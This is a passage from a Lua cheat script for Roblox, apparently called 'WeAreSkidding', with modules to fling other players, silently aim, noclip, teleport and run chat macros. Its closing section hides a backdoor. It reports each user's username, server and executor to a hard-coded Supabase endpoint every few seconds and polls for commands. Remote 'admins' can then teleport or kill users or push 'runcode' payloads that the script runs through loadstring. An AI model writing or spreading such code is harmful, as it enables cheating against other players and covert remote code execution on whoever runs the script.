                if myHRP.AssemblyAngularVelocity.Magnitude > 300 then myHRP.AssemblyAngularVelocity = Vector3.zero end
            end
        end
    end)
    
    pcall(function()
        if S.FlingActive and S.FlingTarget and myHRP then
            local targetChar = S.FlingTarget.Character
            local targetHRP = targetChar and (targetChar:FindFirstChild("HumanoidRootPart") or targetChar:FindFirstChild("Torso") or targetChar.PrimaryPart)
            local targetHum = targetChar and targetChar:FindFirstChildOfClass("Humanoid")
            if targetHRP and targetHum and targetHum.Health > 0 then
                for _, part in ipairs(myChar:GetDescendants()) do if part:IsA("BasePart") then part.CanCollide = false end end
                myHRP.CFrame = targetHRP.CFrame * CFrame.new(0, 0, 1)
                myHRP.AssemblyLinearVelocity = Vector3.new(0, 1000, 0); myHRP.AssemblyAngularVelocity = Vector3.new(0, 50000, 0)
            else
                S.FlingActive = false; local mod = moduleButtons["Fling Player"]; if mod then mod.SetActive(false) end; notify("Fling target lost or dead!", Color3.fromRGB(218, 38, 38))
            end
        elseif S.FlingAllActive and myHRP then
            local now = tick()
            local targetChar = flingAllTarget and flingAllTarget.Character
            local targetHRP = targetChar and (targetChar:FindFirstChild("HumanoidRootPart") or targetChar:FindFirstChild("Torso") or targetChar.PrimaryPart)
            local targetHum = targetChar and targetChar:FindFirstChildOfClass("Humanoid")
            if not targetHRP or not targetHum or targetHum.Health <= 0 or (now - flingAllTime) >= 0.5 then
                flingAllTarget = getNextFlingAllTarget(flingAllTarget); flingAllTime = now
                if flingAllTarget then targetChar = flingAllTarget.Character; targetHRP = targetChar and (targetChar:FindFirstChild("HumanoidRootPart") or targetChar:FindFirstChild("Torso") or targetChar.PrimaryPart)
                else targetHRP = nil end
            end
            if targetHRP then
                for _, part in ipairs(myChar:GetDescendants()) do if part:IsA("BasePart") then part.CanCollide = false end end
                myHRP.CFrame = targetHRP.CFrame * CFrame.new(0, 0, 1)
                myHRP.AssemblyLinearVelocity = Vector3.new(0, 1000, 0); myHRP.AssemblyAngularVelocity = Vector3.new(0, 50000, 0)
            end
        end
    end)
end))

table.insert(S.Connections, RunService.Stepped:Connect(function()
    if S.NoClip then
        local char = getChar()
        if char then for _, p in ipairs(char:GetDescendants()) do if p:IsA("BasePart") then p.CanCollide = false end end end
    end
    if S.AntiFling then
        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= LP and p.Character then
                for _, part in ipairs(p.Character:GetDescendants()) do
                    if part:IsA("BasePart") then pcall(function() part.CanCollide = false; part.AssemblyLinearVelocity = Vector3.zero; part.AssemblyAngularVelocity = Vector3.zero end) end
                end
            end
        end
    end
end))

local function toggleUIVisibility()
    uiVisible = not uiVisible; mainUIContainer.Visible = uiVisible; updateHUDArrayList(); if updateMenuBlur then updateMenuBlur() end
end

table.insert(S.Connections, UserInputService.InputBegan:Connect(function(inp, gpe)
    if S.SilentAim and inp.UserInputType == Enum.UserInputType.MouseButton1 and not UserInputService:GetFocusedTextBox() then
        local target = getAimbotTarget()
        if target then local oldCF = Camera.CFrame; Camera.CFrame = CFrame.new(oldCF.Position, target.Position); RunService.RenderStepped:Wait(); Camera.CFrame = oldCF end
    end
    if inp.KeyCode == (S.UIToggleKey or Enum.KeyCode.RightControl) or inp.KeyCode == Enum.KeyCode.RightControl then toggleUIVisibility(); return end
    if S.PanicKey and inp.KeyCode == S.PanicKey then
        Win:ResetAllToggles(); uiVisible = false; mainUIContainer.Visible = false; updateHUDArrayList(); notify("PANIC! All modules disabled.", Color3.fromRGB(218, 38, 38)); return
    end
    if S.UserIDGrabKey and inp.KeyCode == S.UserIDGrabKey then
        local mouseHit = Mouse.Target; local char = mouseHit and mouseHit.Parent; local p = char and Players:GetPlayerFromCharacter(char)
        if p then if setclipboard then setclipboard(tostring(p.UserId)) end; notify("Copied UserID: " .. p.UserId .. " (" .. p.DisplayName .. ")", Color3.fromRGB(50, 195, 75))
        else notify("No player found under mouse.", Color3.fromRGB(218, 38, 38)) end
        return
    end
    if gpe then return end
    if inp.UserInputType == Enum.UserInputType.MouseButton1 then
        if S.ClickDelete and UserInputService:IsKeyDown(Enum.KeyCode.LeftAlt) then local target = Mouse.Target; if target and not target.Parent:FindFirstChildOfClass("Humanoid") then target:Destroy() end
        elseif S.ClickTeleport and UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then
            local hit = Mouse.Hit; local hrp = getHRP(); local hum = getHum()
            if hit and hrp then if hum then hum.Sit = false end; hrp.CFrame = CFrame.new(hit.Position + Vector3.new(0, 3, 0)) * hrp.CFrame.Rotation; hrp.AssemblyLinearVelocity = Vector3.zero; notify("Teleported to cursor!", Color3.fromRGB(50, 195, 75)) end
        end
    end
    if UserInputService:GetFocusedTextBox() then return end
    if inp.UserInputType ~= Enum.UserInputType.Keyboard then return end
    local k = inp.KeyCode; if k == Enum.KeyCode.Unknown then return end
    
    if S.MacroKey and S.MacroKey ~= Enum.KeyCode.Unknown and k == S.MacroKey and S.MacroText and S.MacroText ~= "" then
        pcall(function()
            local chatService = game:GetService("TextChatService")
            if chatService and chatService.ChatVersion == Enum.ChatVersion.TextChatService then local textChannel = chatService.TextChannels:FindFirstChild("RBXGeneral"); if textChannel then textChannel:SendAsync(S.MacroText) end
            else local sayMsg = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents"); sayMsg = sayMsg and sayMsg:FindFirstChild("SayMessageRequest"); if sayMsg then sayMsg:FireServer(S.MacroText, "All") end end
        end)
    end
    
    if k == Enum.KeyCode.LeftShift then
        if S.SprintEnabled then local hum = getHum(); if hum then hum.WalkSpeed = S.SprintSpeed end end
    elseif S.FlyKey and S.FlyKey ~= Enum.KeyCode.Unknown and k == S.FlyKey then
        S.Fly = not S.Fly; if S.Fly then flyOn() else flyOff() end; notify("Fly Mode " .. (S.Fly and "ON" or "OFF"), Color3.fromRGB(218, 170, 42)); local mod = moduleButtons["Fly Mode"]; if mod then mod.SetActive(S.Fly) end
    elseif S.NoClipKey and S.NoClipKey ~= Enum.KeyCode.Unknown and k == S.NoClipKey then
        S.NoClip = not S.NoClip; notify("NoClip " .. (S.NoClip and "ON" or "OFF"), Color3.fromRGB(218, 170, 42)); local mod = moduleButtons["NoClip Passes"]; if mod then mod.SetActive(S.NoClip) end
    elseif S.BHopKey and S.BHopKey ~= Enum.KeyCode.Unknown and k == S.BHopKey then
        S.BHop = not S.BHop; notify("Bunnyhop " .. (S.BHop and "ON" or "OFF"), Color3.fromRGB(218, 170, 42)); local mod = moduleButtons["Auto Bunnyhop"]; if mod then mod.SetActive(S.BHop) end
    elseif S.InfJumpKey and S.InfJumpKey ~= Enum.KeyCode.Unknown and k == S.InfJumpKey then
        S.InfJump = not S.InfJump; notify("Infinite Jump " .. (S.InfJump and "ON" or "OFF"), Color3.fromRGB(218, 170, 42)); local mod = moduleButtons["Infinite Jump"]; if mod then mod.SetActive(S.InfJump) end
    elseif S.JumpStrengthKey and S.JumpStrengthKey ~= Enum.KeyCode.Unknown and k == S.JumpStrengthKey then
        S.ForceJumpPower = not S.ForceJumpPower; local hum = getHum()
        if hum then if S.ForceJumpPower then hum.UseJumpPower = true; hum.JumpPower = S.JumpPower else hum.UseJumpPower = gameDefaultUseJumpPower; hum.JumpPower = gameDefaultJumpPower end end
        notify("Jump Strength " .. (S.ForceJumpPower and "ON" or "OFF"), Color3.fromRGB(218, 170, 42)); local mod = moduleButtons["Jump Hack Strength"]; if mod then mod.SetActive(S.ForceJumpPower) end; saveConfig()
    elseif S.GhostKey and S.GhostKey ~= Enum.KeyCode.Unknown and k == S.GhostKey then
        S.GhostMode = not S.GhostMode; if S.GhostMode then enableGhostMode() else disableGhostMode() end
        local mod = moduleButtons["Ghost State Mode"]; if mod then mod.SetActive(S.GhostMode) end
    elseif S.BlinkKey and S.BlinkKey ~= Enum.KeyCode.Unknown and k == S.BlinkKey then
        local hrp = getHRP(); local hum = getHum()
        if hrp and hum then
            local dir
            if S.BlinkDirection == "Camera Look" then dir = Camera.CFrame.LookVector else dir = hum.MoveDirection.Magnitude > 0 and hum.MoveDirection or hrp.CFrame.LookVector end
            local targetPos = hrp.Position + dir.Unit * S.BlinkDistance
            if not S.Fly then
                local raycastParams = RaycastParams.new(); raycastParams.FilterType = Enum.RaycastFilterType.Exclude; raycastParams.FilterDescendantsInstances = {LP.Character}
                local rayResult = Workspace:Raycast(targetPos + Vector3.new(0, 2, 0), Vector3.new(0, -15, 0), raycastParams)
                if rayResult then targetPos = Vector3.new(targetPos.X, rayResult.Position.Y + 3.0, targetPos.Z) end
            end
            hrp.CFrame = CFrame.new(targetPos) * hrp.CFrame.Rotation; notify("Blinked forward safely!", Color3.fromRGB(50, 195, 75))
        end
    end
end))

table.insert(S.Connections, UserInputService.InputEnded:Connect(function(inp, gpe)
    if gpe then return end
    if inp.KeyCode == Enum.KeyCode.LeftShift then
        if S.SprintEnabled then local hum = getHum(); if hum then hum.WalkSpeed = (S.ForceWalkSpeed and S.WalkSpeed) or gameDefaultSpeed end end
    end
end))

table.insert(S.Connections, UserInputService.JumpRequest:Connect(function()
    if S.InfJump then local hum = getHum(); if hum then hum:ChangeState(Enum.HumanoidStateType.Jumping) end end
    if S.AirWalk and S.AirWalkPlat then pcall(function() S.AirWalkPlat:Destroy() end); S.AirWalkPlat = nil end
end))

local function onCharSpawn(char)
    task.wait(0.5)
    local hum = char:WaitForChild("Humanoid", 5)
    if hum then
        if not S.ForceWalkSpeed then gameDefaultSpeed = hum.WalkSpeed end
        if not S.ForceJumpPower then gameDefaultJumpPower = hum.JumpPower; gameDefaultUseJumpPower = hum.UseJumpPower end
        hum.UseJumpPower = S.ForceJumpPower and true or gameDefaultUseJumpPower; hum.WalkSpeed = (S.ForceWalkSpeed and S.WalkSpeed) or gameDefaultSpeed
        hum.JumpPower = (S.ForceJumpPower and S.JumpPower) or gameDefaultJumpPower
    end
    if S.Fly then task.wait(0.1); flyOn() end
    if S.Float then task.wait(0.1); toggleFloat(true) end
    if S.TallAnim then applyTallAnimations(char) end
    if S.CustomIdleAnim then applyCustomIdle(char) end
    if S.GodMode then applyGodMode(char) end
    if S.OverheadInfo then task.wait(0.3); refreshOverheads() end
    if S.ForceShiftLock then pcall(function() LP.DevEnableMouseLock = true end) end
    updateLocalNametag()
end

if LP.Character then onCharSpawn(LP.Character) end
table.insert(S.Connections, LP.CharacterAdded:Connect(onCharSpawn))

table.insert(S.Connections, Players.PlayerAdded:Connect(function(p)
    if S.JoinLeaveToasts then notify(p.DisplayName .. " joined the server.", Color3.fromRGB(50, 195, 75)) end
end))

table.insert(S.Connections, Players.PlayerRemoving:Connect(function(p)
    if S.JoinLeaveToasts then notify(p.DisplayName .. " left the server.", Color3.fromRGB(218, 38, 38)) end
    pcall(function()
        destroyESP(p)
        if S.OverheadPool[p] then pcall(function() S.OverheadPool[p]:Destroy() end); S.OverheadPool[p] = nil end
        if S.ChatConnections[p] then pcall(function() S.ChatConnections[p]:Disconnect() end); S.ChatConnections[p] = nil end
        if currentSpectateTarget == p then spectatePlayer(nil) end
    end)
end))

table.insert(S.Connections, LP.Idled:Connect(function()
    if S.AntiAFK then pcall(function() VirtualUser:CaptureController(); VirtualUser:ClickButton2(Vector2.new()) end) end
end))




pcall(connectConsoleLogger)
pcall(connectChatLogger)
pcall(function() applyThemeColor(S.ThemeColor or "Purple"); updateHUDArrayList() end)

local toggleKeyName = S.UIToggleKey and S.UIToggleKey.Name or "RCtrl"
logMessage("System", "WeAreSkidding loaded successfully. Keybind: [" .. toggleKeyName .. "] to toggle UI", Color3.fromRGB(50, 195, 75))
notify("WeAreSkidding loaded! [" .. toggleKeyName .. "] to toggle UI", Color3.fromRGB(50, 195, 75))
print("[WeAreSkidding] Custom GUI loaded successfully!")

    
    
    
    local request = (http and http.request) or http_request or (syn and syn.request)

    clearNetworkTags = function()
        for p, bill in pairs(networkTagsPool) do
            pcall(function() bill:Destroy() end)
        end
        table.clear(networkTagsPool)
        pcall(function() updateNetworkUsersHUD({}) end)
    end

    local function updateNetworkTags(activeUsers)
        local JobId = game.JobId
        local Username = LP.Name
        local activeInServer = {}
        
        for _, u in ipairs(activeUsers) do
            if u.job_id == JobId and u.username ~= Username then
                activeInServer[u.username] = u
            end
        end
        
        pcall(function() updateNetworkUsersHUD(activeInServer) end)
        
        for username, bill in pairs(networkTagsPool) do
            if not activeInServer[username] then
                pcall(function() bill:Destroy() end)
                networkTagsPool[username] = nil
            end
        end
        
        for username, userData in pairs(activeInServer) do
            local p = Players:FindFirstChild(username)
            if p and p.Character and p.Character:FindFirstChild("Head") then
                local head = p.Character.Head
                local bill = networkTagsPool[username]
                if not bill or bill.Parent ~= head then
                    if bill then pcall(function() bill:Destroy() end) end
                    
                    bill = Instance.new("BillboardGui")
                    bill.Name = "NetworkUserTag"
                    bill.Size = UDim2.new(0, 150, 0, 30)
                    bill.Adornee = head
                    bill.AlwaysOnTop = true
                    bill.StudsOffset = Vector3.new(0, 2.5, 0)
                    
                    local frame = Instance.new("Frame")
                    frame.Size = UDim2.new(1, 0, 1, 0)
                    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
                    frame.BackgroundTransparency = 0.3
                    frame.BorderSizePixel = 0
                    frame.Parent = bill
                    
                    local corner = Instance.new("UICorner")
                    corner.CornerRadius = UDim.new(0, 4)
                    corner.Parent = frame
                    
                    local stroke = Instance.new("UIStroke")
                    stroke.Color = userData.is_admin and Color3.fromRGB(255, 235, 59) or currentThemeColor
                    stroke.Thickness = 1
                    stroke.Parent = frame
                    
                    local label = Instance.new("TextLabel")
                    label.Size = UDim2.new(1, 0, 1, 0)
                    label.BackgroundTransparency = 1
                    local roleText = userData.is_admin and "👑 ADMIN" or (userData.executor or "Script User")
                    label.Text = string.format("%s\n<font color='#9ba3af'>[%s]</font>", p.DisplayName, roleText)
                    label.TextColor3 = Color3.fromRGB(255, 255, 255)
                    label.Font = Enum.Font.GothamBold
                    label.TextSize = 10
                    label.RichText = true
                    label.Parent = frame
                    
                    bill.Parent = head
                    networkTagsPool[username] = bill
                end
            end
        end
    end

    runNetworkTagsSync = function()
        if not request then return end
        
        local SUPABASE_URL = "https://nlavwcbdqcmoqmojraeu.supabase.co"
        local SUPABASE_KEY = "sb_publishable__HC4Z5_wV2Daf8o-mgt89Q_z_JH2cif"
        local Username = LP.Name
        local JobId = game.JobId
        local PlaceId = game.PlaceId
        
        local handledCommands = {}
        local lastTeleportTime = 0
        
        local function cleanUrlDecode(str)
            str = string.gsub(str, "+", " ")
            str = string.gsub(str, "%%(%x%x)", function(hex)
                return string.char(tonumber(hex, 16))
            end)
            return str
        end

        local function runLocalExplosionEffect(targetName)
            local targetPlayer = Players:FindFirstChild(targetName)
            if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
                local char = targetPlayer.Character
                local exp = Instance.new("Explosion")
                exp.Position = char.HumanoidRootPart.Position
                exp.BlastRadius = 0; exp.BlastPressure = 0; exp.Parent = workspace
                if char:FindFirstChild("Humanoid") then char.Humanoid.Health = 0 end
                char:BreakJoints()
                for _, part in ipairs(char:GetChildren()) do
                    if part:IsA("BasePart") then
                        part.Velocity = Vector3.new(math.random(-100, 100), math.random(80, 150), math.random(-100, 100))
                    end
                end
            end
        end

        local gameName = "Roblox Game"
        pcall(function()
            local info = game:GetService("MarketplaceService"):GetProductInfo(PlaceId)
            gameName = info.Name
        end)
        
        local function getExecutor()
            if identifyexecutor then
                local name, version = identifyexecutor()
                return name or "Potassium"
            elseif getexecutorname then
                return getexecutorname() or "Potassium"
            end
            return "Potassium"
        end
        local myExecutor = getExecutor()

        local function syncPresence()
            request({
                Url = SUPABASE_URL .. "/rest/v1/executor_sync",
                Method = "POST",
                Headers = {
                    ["apikey"] = SUPABASE_KEY,
                    ["Authorization"] = "Bearer " .. SUPABASE_KEY,
                    ["Content-Type"] = "application/json",
                    ["Prefer"] = "resolution=merge-duplicates"
                },
                Body = game:GetService("HttpService"):JSONEncode({ 
                    username = Username, 
                    job_id = JobId, 
                    place_id = PlaceId,
                    current_game = gameName, 
                    executor = myExecutor, 
                    updated_at = "now()",
                    teleport_target = "none",
                    active_effect = "none"
                })
            })
        end

        local function fetchUsers()
            local pastThreshold = DateTime.fromUnixTimestamp(DateTime.now().UnixTimestamp - 25):ToIsoDate()
            local resUser = request({
                Url = SUPABASE_URL .. "/rest/v1/executor_sync?updated_at=gt." .. pastThreshold .. "&select=username,executor,teleport_target,active_effect,is_admin,is_sub_admin,current_game,job_id,place_id",
                Method = "GET",
                Headers = { ["apikey"] = SUPABASE_KEY, ["Authorization"] = "Bearer " .. SUPABASE_KEY }
            })
            if resUser.StatusCode == 200 then
                local users = game:GetService("HttpService"):JSONDecode(resUser.Body)
                updateNetworkTags(users)

                
                for _, user in ipairs(users) do
                    if user.teleport_target ~= "none" and (user.teleport_target == Username or user.teleport_target == "all") then
                        if tick() - lastTeleportTime > 5 then 
                            local allowedToTeleportMe = false
                            if user.is_admin or user.is_sub_admin then allowedToTeleportMe = true end 

                            if allowedToTeleportMe then
                                lastTeleportTime = tick() 
                                TeleportService:TeleportToPlaceInstance(user.place_id, user.job_id, LP)
                            end
                        end
                    end

                    if user.active_effect ~= "none" then
                        local delimiterIndex = string.find(user.active_effect, "||PAYLOAD||")
                        if delimiterIndex then
                            local headerPart = string.sub(user.active_effect, 1, delimiterIndex - 1)
                            local payloadPart = string.sub(user.active_effect, delimiterIndex + 11)
                            
                            local cmdData = string.split(headerPart, ":")
                            local action = cmdData[1]
                            local target = cmdData[2]
                            local uniqueHash = cmdData[3]

                            if not handledCommands[uniqueHash] then
                                local allowedToHarmMe = false
                                if user.is_admin or user.is_sub_admin then allowedToHarmMe = true end

                                if allowedToHarmMe then
                                    handledCommands[uniqueHash] = true
                                    if action == "runcode" and (target == Username or target == "all") then
                                        local decodedCode = cleanUrlDecode(payloadPart)
                                        local executable, execError = loadstring(decodedCode)
                                        if executable then
                                            task.spawn(executable)
                                        else
                                            warn("Cross-Game Suite Execution Error: " .. tostring(execError))
                                        end
                                    end
                                end
                            end
                        else
                            local cmdData = string.split(user.active_effect, ":")
                            local action = cmdData[1]
                            local target = cmdData[2]
                            local uniqueHash = cmdData[3] 

                            if not handledCommands[uniqueHash] then
                                local allowedToHarmMe = false
                                if user.is_admin or user.is_sub_admin then allowedToHarmMe = true end 

                                if allowedToHarmMe then
                                    handledCommands[uniqueHash] = true 
                                    if action == "kill" or action == "explode" then
                                        if target == Username or target == "all" then runLocalExplosionEffect(Username)
                                        else runLocalExplosionEffect(target) end
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end

        task.spawn(function()
            while true do
                pcall(syncPresence)
                pcall(fetchUsers)
                task.wait(4)
            end
        end)
    end

    
    table.insert(themeToggles, function()
        for username, bill in pairs(networkTagsPool) do
            pcall(function()
                local frame = bill:FindFirstChildOfClass("Frame")
                local stroke = frame and frame:FindFirstChildOfClass("UIStroke")
                if stroke and stroke.Color ~= Color3.fromRGB(255, 235, 59) then
                    stroke.Color = currentThemeColor
                end
            end)
        end
    end)

    
    local cg = game:GetService("CoreGui")
    local pg = LP:WaitForChild("PlayerGui", 5)

    local function monitorChatHub(gui)
        local conn
        conn = gui.Destroying:Connect(function()
            conn:Disconnect()
            S.NetworkChat = false
            saveConfig()
            local mod = moduleButtons["Network Chat Hub"]
            if mod then mod.SetActive(false) end
        end)
    end

    local function onChildAdded(child)
        if child.Name == "DiscordNetworkHub" then
            monitorChatHub(child)
        end
    end

    cg.ChildAdded:Connect(onChildAdded)
    if pg then pg.ChildAdded:Connect(onChildAdded) end

    
    networkTagsRunning = true
    runNetworkTagsSync()

print("[WeAreSkidding] Custom GUI loaded successfully!")


